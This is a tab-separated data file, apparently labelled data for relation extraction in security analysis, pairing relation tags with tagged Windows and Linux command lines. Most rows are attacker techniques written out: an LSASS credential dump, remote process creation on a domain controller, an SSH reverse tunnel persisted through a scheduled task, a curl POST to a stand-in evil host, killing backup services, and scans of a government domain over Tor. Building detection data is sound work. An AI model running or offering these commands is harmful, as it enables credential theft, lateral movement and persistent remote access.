process-file-write(e1,e2)	"<e1>powershell_80.exe</e1> <e2>""[IO.File]::WriteAllText('C:\Temp\backdoor_80.ps1',</e2> 'Invoke-Mimikatz')"""
process-file-write(e1,e2)	"<e1>esentutl.exe</e1> /r V01 /l""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"" /s""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"" <e2>/d""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache""</e2>"
process-file-unlink(e1,e2)	python.exe <e1>del</e1> <e2>C:\Windows\Temp\evil.dll</e2>
process-process-unlink(e1,e2)	<e1>rundll32.exe</e1> kill (Get-Process <e2>winlogon.exe.Id)</e2>
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>wmic</e2> /node:""DOMAINCONTROLLER"" process call create C:\3.exe"
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>icacls</e2> C:\Users\Public\runme.bat /grant Everyone:F
process-process-fork(e1,e2)	<e1>powershell</e1> <e2>rundll32.exe</e2> c:\windows\system32\comsvcs.dll, minidump (get-process lsass).id c:\temp\lsass.dmp full
process-socket-receive(e1,e2)	powershell.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>10.10.10.10:4444</e2>
process-file-read(e1,e2)	<e1>nuclei</e1> -l <e2>sept24.txt</e2> -o sept24_op.txt -s medium
process-process-inject(e1,e2)	<e1>powershell.exe</e1> Set-ProcessInjection -Target <e2>winlogon.exe</e2>
process-file-unlink(e1,e2)	cmd.exe <e1>del</e1> <e2>/tmp/malware.sh</e2>
process-file-write(e1,e2)	<e1>powershell.exe</e1> ls C:\ > <e2>C:\file.txt</e2>
process-socket-send(e1,e2)	powershell.exe <e1>curl</e1> -X POST --data 'ping' <e2>https://evil.server/payload</e2>
process-file-read(e1,e2)	"schtasks.exe /create /sc minute /mo 1 /tn ""SSH Key Exchange"" /rl highest /tr <e1>""C:\ProgramData\sshd\ssh.exe</e1> -i <e2>C:\ProgramData\sshd\config\keys\id_rsa</e2> -N -R 369:127.0.0.1:2222 root@185.206.146.129 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15"""
process-file-write(e1,e2)	"<e1>adfind.exe</e1> -subnets -f ""(objectCategory=subnet)"" > <e2>subnets.txt</e2>"
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.uiserver.exe</e2> /F
process-file-write(e1,e2)	"<e1>sqlcmd</e1> -E -S localhost -Q ""BACKUP DATABASE master TO <e2>DISK='c:\programdata\sql\master.bak'""</e2>"
process-file-chmod(e1,e2)	cmd.exe <e1>attrib</e1> +s +h <e2>C:\Users\Public\runme.bat</e2>
process-file-write(e1,e2)	torify <e1>nuclei</e1> -u shabak.gov.il -o <e2>shabak.gov.il_new</e2>
process-file-write(e1,e2)	"cmd.exe /C netsh advfirewall firewall add rule dir=out name =""WMI_OUT"" <e1>program=C:\Windows\system32\svchost.exe</e1> service=winmgmt action=allow protocol=TCP localport=any > <e2>C:\Windows\Temp\WkiMfXXo.tmp</e2> 2>&1"
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>dllinjector.exe</e2> -p notepad.exe -d payload.dll
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>curl</e2> -X POST --data 'ping' 192.168.1.100:8080
process-file-write(e1,e2)	<e1>adfind.exe</e1> -gcb -sc trustdmp > <e2>ad_trustdmp.txt</e2>
process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 192.168.1.100:8080
